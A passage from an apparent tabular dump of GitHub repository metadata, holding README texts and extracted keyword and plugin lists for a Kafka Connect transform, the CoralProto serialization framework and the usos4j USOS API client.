'simple', 'example', 'branch', 'node', 'join', 'node', 'node', 'manual', 'workflow', 'emr', 'node', 'resource', 'example', 'function', 'example', 'node', 'flowspec', 'example', 'dataworks', 'migration', 'assistant', 'spec', 'package', 'demo', 'flowspec', 'client', 'tool', 'architecture', 'domain', 'model', 'reader', 'transformer', 'writer', 'usage', 'module', 'develop', 'guide', 'contributor']",71,"['field', 'example', 'node', 'flowspec', 'reference']",1,149.0,20.0,"[maven-assembly-plugin,maven-resources-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-dependency-plugin,org.apache.maven.plugins:maven-deploy-plugin,org.apache.maven.plugins:maven-enforcer-plugin,org.apache.maven.plugins:maven-failsafe-plugin,org.apache.maven.plugins:maven-source-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.codehaus.mojo:exec-maven-plugin,org.codehaus.mojo:versions-maven-plugin]",0.0,16.0,4.0,26051,59.44444444444444,5.813551401869159,"['![License -> https://img.shields.io/badge/license-Apache%202-4EB1BA.svg', 'version -> https://img.shields.io/badge/version-1.2.0-blue', '![Java CI with Maven -> https://github.com/aliyun/dataworks-spec/actions/workflows/main.yml/badge.svg', '![CN doc -> https://img.shields.io/badge/文档-中文版-blue.svg']",4
EladLeev/KeyToField-smt,main,"# KeyToField - SMT for Kafka Connect / Debezium
A Kafka Connect SMT that allows you to add the record key to the value as a named field.

## Overview
The `KeyToField` transformation is designed to enhance Kafka Connect functionality by including the record key as a field within the record's value. This can be particularly useful in scenarios where downstream systems require access to the original key alongside the record data.

> This SMT was featured on [Confluent's Newsletter](https://developer.confluent.io/newsletter/you-put-what-in-your-events/#:~:text=A%20single%20message%20key%20to%20field%20transform%20for%20Kafka%20Connect/Debezium%20by%20Elad%20Leev!%20In%20a%20way%20it%E2%80%99s%20the%20reverse%20of%20the%20ValueToKey%20SMT%20that%20comes%20with%20Kafka%20Connect%2C%20useful%20for%20when%20the%20fields%20in%20the%20key%20are%20not%20included%20in%20the%20value.)! 🚀

## Features
* Add the record key to the value as a named field.
* Customizable field name and delimiter.

## Installation
1. Use the latest release on GitHub, or build the JAR file from source using Maven:
```bash
mvn clean package
```
2. Copy the generated JAR file (`keytofield-transform-<version>.jar`) to the Kafka Connect plugins directory.
3. Restart Kafka Connect for the reload the plugin directory.
4. Update your connector with the SMT configuration

## Configuration
The KeyToField transformation can be configured with the following properties:

* `field.name`: Name of the field to insert the Kafka key to (default: `kafkaKey`).
* `field.delimiter`: Delimiter to use when concatenating the key fields (default: `-`).

## Usage
To use the `KeyToField` transformation, add it to your Kafka Connect connector configuration:
```
transforms=keyToField
transforms.keyToField.type=com.github.eladleev.kafka.connect.transform.keytofield.KeyToFieldTransform
transforms.keyToField.field.name=primaryKey
transforms.keyToField.field.delimiter=_
```

### Example
Consider a Kafka topic with the following record:


```json
{
  ""key"": {
    ""id"": 123,
    ""timestamp"": 1644439200000
  },
  ""value"": {
    ""data"": ""example""
  }
}
```

After applying the `KeyToField` transformation, the record will be transformed as follows:

```json
{
  ""key"": {
    ""id"": 123,
    ""timestamp"": 1644439200000
  },
  ""value"": {
    ""data"": ""example"",
    ""primaryKey"": ""123_1644439200000""
  }
}
```
## Local Development
For your convenience, under `dev/` you can find a `docker-compose` file that contains all necessary components for local development and testing. Kafka Connect will automatically load the connector from the `target/` directory.   
Use the attached bash script to submit a new Kafka Connect connector. `Adminer` can be used to ingest new data to the database, reflected by an event in Kafka.

## Contributing
Please read [CONTRIBUTING.md](CONTRIBUTING.md) for details of submitting a pull requests.

## License
This project is licensed under the Apache License - see the [LICENSE](LICENSE) file for details.
",2,1,5,apache-2.0,3.0,"['keytofield', 'smt', 'kafka', 'connect', 'debezium', 'kafka', 'connect', 'smt', 'allows', 'add', 'record', 'key', 'value', 'named', 'field', 'overview', 'transformation', 'designed', 'enhance', 'kafka', 'connect', 'functionality', 'including', 'record', 'key', 'field', 'within', 'record', 'value', 'particularly', 'useful', 'scenario', 'downstream', 'system', 'require', 'access', 'original', 'key', 'alongside', 'record', 'data', 'smt', 'featured', 'confluent', 'newsletter', 'feature', 'add', 'record', 'key', 'value', 'named', 'field', 'customizable', 'field', 'name', 'delimiter', 'installation', 'use', 'latest', 'release', 'github', 'build', 'jar', 'file', 'source', 'using', 'maven', 'copy', 'generated', 'jar', 'file', 'kafka', 'connect', 'plugins', 'directory', 'restart', 'kafka', 'connect', 'reload', 'plugin', 'directory', 'update', 'connector', 'smt', 'configuration', 'configuration', 'keytofield', 'transformation', 'configured', 'following', 'property', 'name', 'field', 'insert', 'kafka', 'key', 'default', 'delimiter', 'use', 'concatenating', 'key', 'field', 'default', 'usage', 'use', 'transformation', 'add', 'kafka', 'connect', 'connector', 'configuration', 'example', 'consider', 'kafka', 'topic', 'following', 'record', 'applying', 'transformation', 'record', 'transformed', 'follows', 'local', 'development', 'convenience', 'find', 'file', 'contains', 'necessary', 'component', 'local', 'development', 'testing', 'kafka', 'connect', 'automatically', 'load', 'connector', 'directory', 'use', 'attached', 'bash', 'script', 'submit', 'new', 'kafka', 'connect', 'connector', 'used', 'ingest', 'new', 'data', 'database', 'reflected', 'event', 'kafka', 'contributing', 'please', 'read', 'detail', 'submitting', 'pull', 'request', 'license', 'project', 'licensed', 'apache', 'license', 'see', 'license', 'file', 'detail']","['kafka', 'connect', 'record', 'key', 'field']",3,0,0,"['keytofield', 'smt', 'kafka', 'connect', 'debezium', 'overview', 'feature', 'installation', 'configuration', 'usage', 'example', 'local', 'development', 'contribute', 'license']",10,"['keytofield', 'smt', 'kafka', 'connect', 'debezium']",4,7.0,1.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-jar-plugin,org.jacoco:jacoco-maven-plugin]",0.0,1.0,0.0,2998,20.8,5.502403846153846,"[""Confluent's Newsletter -> https://developer.confluent.io/newsletter/you-put-what-in-your-events/#:~:text=A%20single%20message%20key%20to%20field%20transform%20for%20Kafka%20Connect/Debezium%20by%20Elad%20Leev!%20In%20a%20way%20it%E2%80%99s%20the%20reverse%20of%20the%20ValueToKey%20SMT%20that%20comes%20with%20Kafka%20Connect%2C%20useful%20for%20when%20the%20fields%20in%20the%20key%20are%20not%20included%20in%20the%20value.""]",1
coralblocks/CoralProto,main,"# CoralProto
A fast, binary and garbage-free serialization framework with a simple schema definition language.

## Features
- Simple schema definition language with message type and subtype
- Fast parsing (or direct access without parsing)
- Strictly binary (big-endian)
- Ascii encoding for logging/debugging
- Garbage-free (no GC overhead)
- Primitive types (boolean, char, byte, short, int, long, float and double)
- Fixed byte and char arrays
- Variable byte and char arrays (VarChars and VarBytes)
- Enum fields (CharEnum, ShortEnum, IntEnum and TwoCharEnum)
- Fields can be made optional
- Repeating groups with nesting support (repeating groups inside repeating groups)
- Schema evolution by appending new (optional or non-optional) fields

## Schema Definition Language
```plain
    CLASSNAME = com.coralblocks.coralproto.example.PriceChangeMessage
    TYPE = P
    SUBTYPE = C
    
    symbolId: long
    symbolDesc: varchars(128)
    mqReqId: long!
    
    orders:
        side: boolean
        levelId: long!
        priceLevel: double
        qty: int
        legs:
          legId: int
          legDesc: chars(8)!
        orderId: long
    
    lastTradeQty: long!
    lastTradePrice: double!
```
- TYPE and SUBTYPE are mandatory
- An exclamation mark at the end of a field indicates that the field is optional
- Repeating groups are created through indentation
- The number between parenthesis for varchars (and varbytes) is the maximum allowed size/length
- The number between parenthesis for chars (and bytes) is the fixed size/length

**NOTE:** For convenience, you can place the schema specification inside the Java class so that when you execute its main method the class is updated with the generated source code of the message. You can see an example [here](https://github.com/coralblocks/CoralProto/blob/main/src/main/java/com/coralblocks/coralproto/example/PriceChangeMessage.java).

## Writting the Message Fields
```java
PriceChangeMessage proto = new PriceChangeMessage();

proto.symbolId.set(1111L);
proto.symbolDesc.set(""IBM"");
proto.mqReqId.markAsNotPresent();

    proto.orders.clear();

    proto.orders.nextElement();
    proto.orders.side.set(true);
    proto.orders.levelId.set(11111111L);
    proto.orders.priceLevel.set(200.15);
    proto.orders.qty.set(1000);

        proto.orders.legs.clear();
    
        proto.orders.legs.nextElement();
        proto.orders.legs.legId.set(1);
        proto.orders.legs.legDesc.markAsNotPresent();
        
        proto.orders.legs.nextElement();
        proto.orders.legs.legId.set(2);
        proto.orders.legs.legDesc.set(""myLeg2  "");

    proto.orders.orderId.set(1234L);

    proto.orders.nextElement();
    proto.orders.side.set(false);
    proto.orders.levelId.set(22222222L);
    proto.orders.priceLevel.set(200.75);
    proto.orders.qty.set(800);
    
        proto.orders.legs.clear();
    
        proto.orders.legs.nextElement();
        proto.orders.legs.legId.set(1);
        proto.orders.legs.legDesc.set(""myLeg1  "");
        
        proto.orders.legs.nextElement();
        proto.orders.legs.legId.set(2);
        proto.orders.legs.legDesc.markAsNotPresent();
    
    proto.orders.orderId.set(5678L);

proto.lastTradeQty.set(100);
proto.lastTradePrice.set(200.55);
```

## Reading the Message Fields
```java
Assert.assertEquals(PriceChangeMessage.TYPE, proto.getType());
Assert.assertEquals(PriceChangeMessage.SUBTYPE, proto.getSubtype());

Assert.assertEquals(1111L, proto.symbolId.get());
Assert.assertEquals(""IBM"", proto.symbolDesc.get().toString());
Assert.assertEquals(false, proto.mqReqId.isPresent());

Assert.assertEquals(2, proto.orders.getNumberOfElements());

proto.orders.beginIteration();

Assert.assertEquals(true, proto.orders.iterHasNext());
proto.orders.iterNext();

Assert.assertEquals(true, proto.orders.side.get());
Assert.assertEquals(11111111L, proto.orders.levelId.get());
Assert.assertTrue(200.15 == proto.orders.priceLevel.get());
Assert.assertEquals(1000, proto.orders.qty.get());

Assert.assertEquals(2, proto.orders.legs.getNumberOfElements());

proto.orders.legs.beginIteration();

Assert.assertEquals(true, proto.orders.legs.iterHasNext());
proto.orders.legs.iterNext();

Assert.assertEquals(1, proto.orders.legs.legId.get());
Assert.assertEquals(false, proto.orders.legs.legDesc.isPresent());

Assert.assertEquals(true, proto.orders.legs.iterHasNext());
proto.orders.legs.iterNext();

Assert.assertEquals(2, proto.orders.legs.legId.get());
Assert.assertEquals(""myLeg2  "", proto.orders.legs.legDesc.get().toString());

Assert.assertEquals(false, proto.orders.legs.iterHasNext());

Assert.assertEquals(true, proto.orders.iterHasNext());
proto.orders.iterNext();

Assert.assertEquals(false, proto.orders.side.get());
Assert.assertEquals(22222222L, proto.orders.levelId.get());
Assert.assertTrue(200.75 == proto.orders.priceLevel.get());
Assert.assertEquals(800, proto.orders.qty.get());

Assert.assertEquals(2, proto.orders.legs.getNumberOfElements());

proto.orders.legs.beginIteration();

Assert.assertEquals(true, proto.orders.legs.iterHasNext());
proto.orders.legs.iterNext();

Assert.assertEquals(1, proto.orders.legs.legId.get());
Assert.assertEquals(""myLeg1  "", proto.orders.legs.legDesc.get().toString());

Assert.assertEquals(true, proto.orders.legs.iterHasNext());
proto.orders.legs.iterNext();

Assert.assertEquals(2, proto.orders.legs.legId.get());
Assert.assertEquals(false, proto.orders.legs.legDesc.isPresent());

Assert.assertEquals(false, proto.orders.legs.iterHasNext());

Assert.assertEquals(false, proto.orders.iterHasNext());

Assert.assertEquals(100, proto.lastTradeQty.get());
Assert.assertTrue(200.55 == proto.lastTradePrice.get());
```
**NOTE:** The full automated test for the PriceChangeMessage can be seen [here](https://github.com/coralblocks/CoralProto/blob/main/src/test/java/com/coralblocks/coralproto/PriceChangeMessageTest.java).

## Writting to and Reading from a ByteBuffer
```java
PriceChangeMessage proto = new PriceChangeMessage();

proto.symbolId.set(1111L);

ByteBuffer bb = ByteBuffer.allocate(1024);
proto.write(bb);
bb.flip();

PriceChangeMessage received = new PriceChangeMessage();

received.read(bb);

Assert.assertTrue(received.equals(proto));
Assert.assertEquals(proto.orders.symbolId.get(), received.orders.symbolId.get());
```

## Using a ProtoParser
```java
public static class MyProtoParser extends ProtoParser {

    @Override
    protected Proto[] defineProtoMessages() {
        return new Proto[] {
                new ProtoMessage1(),
                new ProtoMessage2()
        };
    }
}

ProtoParser protoParser = new MyProtoParser();

Proto proto = protoParser.parse(byteBuffer);

if (proto == null) throw new RuntimeException(""Cannot parse ByteBuffer to Proto!"");

char type = proto.getType();
char subtype = proto.getSubtype();

if (type == ProtoMessage1.TYPE && subtype == ProtoMessage1.SUBTYPE) {
    ProtoMessage1 protoMessage1 = (ProtoMessage1) proto;
    // access the ProtoMessage1 fields and be happy...
} else if (type == ProtoMessage2.TYPE && subtype == ProtoMessage2.SUBTYPE) {
    ProtoMessage2 protoMessage2 = (ProtoMessage2) proto;
    // access the ProtoMessage2 fields and be happy...
} else {
    throw new RuntimeException(""Got a proto that I don't know how to handle: "" + proto);
}
```

## Using Enum Fields
You should provide enumerations that implement [CharEnum](https://github.com/coralblocks/CoralProto/blob/main/src/main/java/com/coralblocks/coralproto/enums/CharEnum.java), [ShortEnum](https://github.com/coralblocks/CoralProto/blob/main/src/main/java/com/coralblocks/coralproto/enums/ShortEnum.java), [IntEnum](https://github.com/coralblocks/CoralProto/blob/main/src/main/java/com/coralblocks/coralproto/enums/IntEnum.java) or [TwoCharEnum](https://github.com/coralblocks/CoralProto/blob/main/src/main/java/com/coralblocks/coralproto/enums/TwoCharEnum.java). Below an example:
```java
public static enum Side implements CharEnum { 

    BUY('B'), 
    SELL('S');

    private final char b;
    public final static CharMap<Side> ALL = new CharMap<Side>();
    
    static {
        for(Side s : Side.values()) {
            if (ALL.put(s.getChar(), s) != null) {
                throw new IllegalStateException(""Cannot have two sides with the same character: "" + s);
            }
        }
    }
    
    private Side(char b) {
        this.b = b;
    }
    
    @Override
    public final char getChar() {
        return b;
    }
}
```
And to define in your schema you simply do:
```plain
    side:     charEnum(Side) 
```
The corresponding char of the enum will be transmitted through the wire.

## Float and Double Fields
- Floats are transmitted through the wire as integers (4-byte big-endian). The default precision is 4 decimals.
- Doubles are transmitted through the wire as longs (8-byte big-endian). The default precision is 8 decimals.

If you need more or less decimal precision, you can pass the number of decimals when defining the field in the schema:
```plain
    myFloat1: float 
    myFloat2: float(3)
    myFloat3: float(5)
    myDouble1: double 
    myDouble2: double(7)
    myDouble3: double(9)	
```

## Evolving the Schema
You can evolve the schema without breaking compatibility by appending new fields to the end of your message. For example, you can evolve:
```plain
    CLASSNAME = com.coralblocks.coralproto.example.ProtoMessage1
    TYPE = P
    SUBTYPE = A
    
    symbolId: long
    symbolDesc: varchars(128)!
```
by appending a new field:
```plain
    CLASSNAME = com.coralblocks.coralproto.example.ProtoMessage1A
    TYPE = P
    SUBTYPE = A
    
    symbolId: long
    symbolDesc: varchars(128)!
    extraField: int
```
Then you can send an old version (without the field) to the new version:
```java
ByteBuffer bb = ByteBuffer.allocate(1024);

ProtoMessage1 p1 = new ProtoMessage1();

p1.symbolId.set(2L);
p1.symbolDesc.set(""IBM"");

p1.write(bb);

bb.flip();

Assert.assertEquals(ProtoMessage1A.TYPE, bb.get());
Assert.assertEquals(ProtoMessage1A.SUBTYPE, bb.get());

// schema has evolved, it now has an extra field...

ProtoMessage1A p1A = new ProtoMessage1A();

p1A.read(bb);

Assert.assertEquals(2L, p1A.symbolId.get());
Assert.assertEquals(""IBM"", p1A.symbolDesc.get().toString());
Assert.assertEquals(0, p1A.extraField.get()); // default value
```
And you can send a new version (with the field) to the old version:
```java
ByteBuffer bb = ByteBuffer.allocate(1024);

ProtoMessage1A p1A = new ProtoMessage1A();

p1A.symbolId.set(2L);
p1A.symbolDesc.set(""IBM"");
p1A.extraField.set(111);

p1A.write(bb);

bb.flip();

Assert.assertEquals(ProtoMessage1.TYPE, bb.get());
Assert.assertEquals(ProtoMessage1.SUBTYPE, bb.get());

ProtoMessage1 p1 = new ProtoMessage1();

p1.read(bb);

Assert.assertEquals(2L, p1.symbolId.get());
Assert.assertEquals(""IBM"", p1.symbolDesc.get().toString());
```
**NOTE:** We are changing the message name from `ProtoMessage1` to `ProtoMessage1A` just to be able to test inside the same class. When you evolve a message you will want to keep the same message name.

## Generating Source Code
To generate the Java source code of your messages from the schema definition files, you should do:
```plain
$ java com.coralblocks.coralproto.IDL <FOLDER_NAME> <DRY_RUN> <EXTENSION>
```
- The `FOLDER_NAME` argument is the folder where the test files containing the scheme definition of your messages are located. Each message should have its own file.
  
- The `DRY_RUN` argument is to test without replacing any source code. It defaults to false.
  
- The `EXTENSION` argument is the extension of the text files with the schema definition. It defaults to `.idl`.
  
The source code of the messages will be generated inside the same folder.

**NOTE:** When the source code is generated you will most probably need to use `ORGANIZE IMPORTS` (usually CTRL + O) of your IDE to add the correct import statements for the code to compile.

## Logging in Ascii
You can print/log your message in ascii. See below:
```java
bb.clear();
proto.writeAscii(true, bb); // short version (without the message name, just type and subtype)
bb.flip();

Assert.assertEquals(""AF|Y|33|S|1111|222222|3300"", ByteBufferUtils.parseString(bb));

bb.clear();
received.writeAscii(false, bb); // long version (with the message name, type and subtype)
bb.flip();

Assert.assertEquals(""AF (AllFieldsProtoMessage)|Y|33|S|1111|222222|3300"", ByteBufferUtils.parseString(bb));
```
",0,0,1,apache-2.0,0.0,"['coralproto', 'fast', 'binary', 'serialization', 'framework', 'simple', 'schema', 'definition', 'language', 'feature', 'simple', 'schema', 'definition', 'language', 'message', 'type', 'subtype', 'fast', 'parsing', 'direct', 'access', 'without', 'parsing', 'strictly', 'binary', 'ascii', 'encoding', 'gc', 'overhead', 'primitive', 'type', 'boolean', 'char', 'byte', 'short', 'int', 'long', 'float', 'double', 'fixed', 'byte', 'char', 'array', 'variable', 'byte', 'char', 'array', 'varchars', 'varbytes', 'enum', 'field', 'charenum', 'shortenum', 'intenum', 'twocharenum', 'field', 'made', 'optional', 'repeating', 'group', 'nesting', 'support', 'repeating', 'group', 'inside', 'repeating', 'group', 'schema', 'evolution', 'appending', 'new', 'optional', 'field', 'schema', 'definition', 'language', 'type', 'subtype', 'mandatory', 'exclamation', 'mark', 'end', 'field', 'indicates', 'field', 'optional', 'repeating', 'group', 'created', 'indentation', 'number', 'parenthesis', 'varchars', 'varbytes', 'maximum', 'allowed', 'number', 'parenthesis', 'char', 'byte', 'fixed', 'note', 'convenience', 'place', 'schema', 'specification', 'inside', 'java', 'class', 'execute', 'main', 'method', 'class', 'updated', 'generated', 'source', 'code', 'message', 'see', 'example', 'writting', 'message', 'field', 'reading', 'message', 'field', 'note', 'full', 'automated', 'test', 'pricechangemessage', 'seen', 'writting', 'reading', 'bytebuffer', 'using', 'protoparser', 'using', 'enum', 'field', 'provide', 'enumeration', 'implement', 'charenum', 'shortenum', 'intenum', 'twocharenum', 'example', 'define', 'schema', 'simply', 'corresponding', 'char', 'enum', 'transmitted', 'wire', 'float', 'double', 'field', 'float', 'transmitted', 'wire', 'integer', 'default', 'precision', 'decimal', 'double', 'transmitted', 'wire', 'longs', 'default', 'precision', 'decimal', 'need', 'less', 'decimal', 'precision', 'pas', 'number', 'decimal', 'defining', 'field', 'schema', 'evolving', 'schema', 'evolve', 'schema', 'without', 'breaking', 'compatibility', 'appending', 'new', 'field', 'end', 'message', 'example', 'evolve', 'appending', 'new', 'field', 'send', 'old', 'version', 'without', 'field', 'new', 'version', 'send', 'new', 'version', 'field', 'old', 'version', 'note', 'changing', 'message', 'name', 'able', 'test', 'inside', 'class', 'evolve', 'message', 'want', 'keep', 'message', 'name', 'generating', 'source', 'code', 'generate', 'java', 'source', 'code', 'message', 'schema', 'definition', 'file', 'argument', 'folder', 'test', 'file', 'containing', 'scheme', 'definition', 'message', 'located', 'message', 'file', 'argument', 'test', 'without', 'replacing', 'source', 'code', 'default', 'false', 'argument', 'extension', 'text', 'file', 'schema', 'definition', 'default', 'source', 'code', 'message', 'generated', 'inside', 'folder', 'note', 'source', 'code', 'generated', 'probably', 'need', 'use', 'usually', 'ctrl', 'ide', 'add', 'correct', 'import', 'statement', 'code', 'compile', 'logging', 'ascii', 'message', 'ascii', 'see']","['field', 'message', 'schema', 'code', 'definition']",7,0,0,"['coralproto', 'feature', 'schema', 'definition', 'language', 'writting', 'message', 'field', 'read', 'message', 'field', 'writting', 'reading', 'bytebuffer', 'use', 'protoparser', 'use', 'enum', 'field', 'float', 'double', 'field', 'evolve', 'schema', 'generate', 'source', 'code', 'log', 'ascii']",12,"['field', 'schema', 'writting', 'message', 'use']",14,23.0,1.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-jar-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-release-plugin,org.apache.maven.plugins:maven-shade-plugin,org.apache.maven.plugins:maven-source-plugin]",0.0,1.0,0.0,12411,51.29032258064516,5.675471698113207,"['here -> https://github.com/coralblocks/CoralProto/blob/main/src/main/java/com/coralblocks/coralproto/example/PriceChangeMessage.java', 'here -> https://github.com/coralblocks/CoralProto/blob/main/src/test/java/com/coralblocks/coralproto/PriceChangeMessageTest.java', 'CharEnum -> https://github.com/coralblocks/CoralProto/blob/main/src/main/java/com/coralblocks/coralproto/enums/CharEnum.java', 'ShortEnum -> https://github.com/coralblocks/CoralProto/blob/main/src/main/java/com/coralblocks/coralproto/enums/ShortEnum.java', 'IntEnum -> https://github.com/coralblocks/CoralProto/blob/main/src/main/java/com/coralblocks/coralproto/enums/IntEnum.java', 'TwoCharEnum -> https://github.com/coralblocks/CoralProto/blob/main/src/main/java/com/coralblocks/coralproto/enums/TwoCharEnum.java']",6
WMS-DEV/usos4j,main,"# usos4j - Java client for USOS API

✨ using USOS API just became fun ✨

## Features

- **Simplified Communication**: Easily interact with the USOS API without dealing with the complexities of low-level HTTP requests.
- **Detailed Documentation**: Comprehensive documentation, with practical demos, to guide developers on how to use the library effectively.
- **Authentication Handling**: Streamlined handling of OAuth and access tokens for secure communication with the USOS API.
- **Modular Design**: Organized into modules for easy integration and maintenance.
- **Well tested**: Includes integration and architecture tests to ensure the reliability and stability of the library.
- **Open for extension**: The library includes constructs, that make it easy to integrate additional modules, without relying on the library development itself, see generic endpoint demo below

## Getting Started

### Note: JDK 17+ is required

The library is available on maven-central, use this code snippet to use it!
```XML
<dependency>
    <groupId>pl.wmsdev</groupId>
    <artifactId>usos4j</artifactId>
    <version>1.1.4</version>
</dependency>
```

Consider checking out our demos on how to use usos4j on basic scenarios:

- [Console application with code-based authentication](https://github.com/WMS-DEV/usos4j/tree/master/demo)
- [Web application with oAuth authentication](https://github.com/WMS-DEV/usos4j/tree/master/spring-demo)
- [Full Spring Security integration - log in to your aplication through USOS](https://github.com/WMS-DEV/usos4j/tree/master/spring-security-demo)

We also offer you an access to a generic endpoint, which can make it easier for you to access USOS as you wish, providing the authentication support, here is an example on how you can use it:
```java
var usos = Usos.builder()......build();
var serverApi = usos.getServerApi();
var usosApiRefModuleResponse = serverApi.generic()
                .request(""services/apiref/module"", Map.of(""name"", List.of(""services/crstests"")), UsosApiRefModule.class); // this is performed as an unauthenticated API client
var userApi = usos.getUserApi();
var userApiRefModuleResponse = userApi.generic()
                .request(""services/apiref/module"", Map.of(""name"", List.of(""services/crstests"")), UsosApiRefModule.class); // this is performed as a user
```

## Integrated modules:
The library supports
- apiref
- apisrv
- calendar
- cards
- courses
- credits
- fac
- feedback
- grades
- groups
- mailing
- news
- payments
- phones
- photos
- plctests
- progs
- registrations
- terms
- theses
- timetable
- rest of the modules thanks to generic endpoint implementation

We decided to integrate the most interesting endpoints from the user perspective. We are very open for contributions integrating more modules, but it's not so easy, as we are not in possesion of any USOS testing enviroment, meaning we can only integrate modules, that the universities of contributors use.

## Documentation

- Checkout our contribution guidelines
- To fully understand the concepts in the library, consider visiting debug module, where you will be able to find integration tests

## System configuration

You can find available websites for generating USOSAPI keys in [the installations list](https://apps.usos.edu.pl/developers/api/definitions/installations/) 

Usos integration tests and demos, are based on this system enviroments configuration:

- usos_baseurl - base url of USOSAPI that you would like to use. For Politechnika Wrocławska it would be https://apps.usos.pwr.edu.pl/
- usos_consumerKey - Consumer key. You can generate it on a proper USOS APPS website. For Politechnika Wrocławska it would be https://apps.usos.pwr.edu.pl/developers/
- usos_consumerSecret - Consumer secret, also generated from the website above
- usos_login - login to your USOS account, if you wish to use HeadlessUsosProvider (automatic possesion of authorization tokens)
- usos_password - password to your USOS account, as above

## Contributing

We welcome contributions from the community! If you would like to contribute to the USOS API Communication Library, please refer to the [Contributors Guidelines](git/usos4j-prod/CONTRIBUTORS.md) for instructions on how to get started.

## Support

If you encounter any issues or have any questions about usos4j, please feel free to [open an issue](../../issues) on GitHub. We are here to help!

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## Acknowledgments

We would like to thank all the contributors who have helped make this project possible. Especially the WMS creators of the library:
- [@gniadeck](https://github.com/gniadeck)
- [@MDybek](https://github.com/MDybek)
- [@Foxyg3n](https://github.com/Foxyg3n)
- [@pszumanski](https://github.com/pszumanski)
- [@michalK00](https://github.com/michalK00)

---

Thank you for choosing usos4j. We hope it simplifies your interaction with the USOS API and enhances your development experience! 🚀
Feel free to share any amazing project you create with it B)
",7,0,2,mit,16.0,"['java', 'client', 'usos', 'api', 'using', 'usos', 'api', 'became', 'fun', 'feature', 'simplified', 'communication', 'easily', 'interact', 'usos', 'api', 'without', 'dealing', 'complexity', 'http', 'request', 'detailed', 'documentation', 'comprehensive', 'documentation', 'practical', 'demo', 'guide', 'developer', 'use', 'library', 'effectively', 'authentication', 'handling', 'streamlined', 'handling', 'oauth', 'access', 'token', 'secure', 'communication', 'usos', 'api', 'modular', 'design', 'organized', 'module', 'easy', 'integration', 'maintenance', 'well', 'tested', 'includes', 'integration', 'architecture', 'test', 'ensure', 'reliability', 'stability', 'library', 'open', 'extension', 'library', 'includes', 'construct', 'make', 'easy', 'integrate', 'additional', 'module', 'without', 'relying', 'library', 'development', 'see', 'generic', 'endpoint', 'demo', 'getting', 'started', 'note', 'jdk', 'required', 'library', 'available', 'use', 'code', 'snippet', 'use', 'consider', 'checking', 'demo', 'use', 'basic', 'scenario', 'console', 'application', 'authentication', 'web', 'application', 'oauth', 'authentication', 'full', 'spring', 'security', 'integration', 'log', 'aplication', 'usos', 'also', 'offer', 'access', 'generic', 'endpoint', 'make', 'easier', 'access', 'usos', 'wish', 'providing', 'authentication', 'support', 'example', 'use', 'integrated', 'module', 'library', 'support', 'apiref', 'apisrv', 'calendar', 'card', 'course', 'credit', 'fac', 'feedback', 'grade', 'group', 'mailing', 'news', 'payment', 'phone', 'photo', 'plctests', 'progs', 'registration', 'term', 'thesis', 'timetable', 'rest', 'module', 'thanks', 'generic', 'endpoint', 'implementation', 'decided', 'integrate', 'interesting', 'endpoint', 'user', 'perspective', 'open', 'contribution', 'integrating', 'module', 'easy', 'possesion', 'usos', 'testing', 'enviroment', 'meaning', 'integrate', 'module', 'university', 'contributor', 'use', 'documentation', 'checkout', 'contribution', 'guideline', 'fully', 'understand', 'concept', 'library', 'consider', 'visiting', 'debug', 'module', 'able', 'find', 'integration', 'test', 'system', 'configuration', 'find', 'available', 'website', 'generating', 'usosapi', 'key', 'installation', 'list', 'usos', 'integration', 'test', 'demo', 'based', 'system', 'enviroments', 'configuration', 'base', 'url', 'usosapi', 'would', 'like', 'use', 'politechnika', 'would', 'http', 'consumer', 'key', 'generate', 'proper', 'usos', 'apps', 'website', 'politechnika', 'would', 'http', 'consumer', 'secret', 'also', 'generated', 'website', 'login', 'usos', 'account', 'wish', 'use', 'headlessusosprovider', 'automatic', 'possesion', 'authorization', 'token', 'password', 'usos', 'account', 'contributing', 'welcome', 'contribution', 'community', 'would', 'like', 'contribute', 'usos', 'api', 'communication', 'library', 'please', 'refer', 'contributor', 'guideline', 'instruction', 'get', 'started', 'support', 'encounter', 'issue', 'question', 'please', 'feel', 'free', 'open', 'issue', 'github', 'help', 'license', 'project', 'licensed', 'mit', 'license', 'see', 'license', 'file', 'detail', 'acknowledgment', 'would', 'like', 'thank', 'contributor', 'helped', 'make', 'project', 'possible', 'especially', 'wms', 'creator', 'library', 'gniadeck', 'mdybek', 'pszumanski', 'thank', 'choosing', 'hope', 'simplifies', 'interaction', 'usos', 'api', 'enhances', 'development', 'experience', 'feel', 'free', 'share', 'amazing', 'project', 'create', 'b']","['usos', 'library', 'use', 'module', 'api']",1,0,0,"['java', 'client', 'usos', 'api', 'feature', 'get', 'start', 'note', 'jdk', 'require', 'integrate', 'module', 'documentation', 'system', 'configuration', 'contribute', 'support', 'license', 'acknowledgment']",11,"['java', 'client', 'usos', 'api', 'feature']",2,138.0,5.0,"[org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-source-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.projectlombok:lombok-maven-plugin,org.sonatype.central:central-publishing-maven-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,5.0,0.0,5050,35.35,5.490806223479491,"['Console application with code-based authentication -> https://github.com/WMS-DEV/usos4j/tree/master/demo', 'Web application with oAuth authentication -> https://github.com/WMS-DEV/usos4j/tree/master/spring-demo', 'Full Spring Security integration - log in to your aplication through USOS -> https://github.com/WMS-DEV/usos4j/tree/master/spring-security-demo', 'the installations list -> https://apps.usos.edu.pl/developers/api/definitions/installations/', '@gniadeck -> https://github.com/gniadeck', '@MDybek -> https://github.com/MDybek', '@Foxyg3n -> https://github.com/Foxyg3n', '@pszumanski -> https://github.com/pszumanski', '@michalK00 -> https://github.com/michalK00']",9
Kamesuta/BungeePteroPower,main,"# BungeePteroPower
![LogoArt](https://github.com/Kamesuta/BungeePteroPower/assets/16362824/e8914f79-806b-436c-a0e6-e4eaf8ad5eca)  
[![License: MIT](https://img.shields.io/github/license/Kamesuta/BungeePteroPower?label=License)](LICENSE)
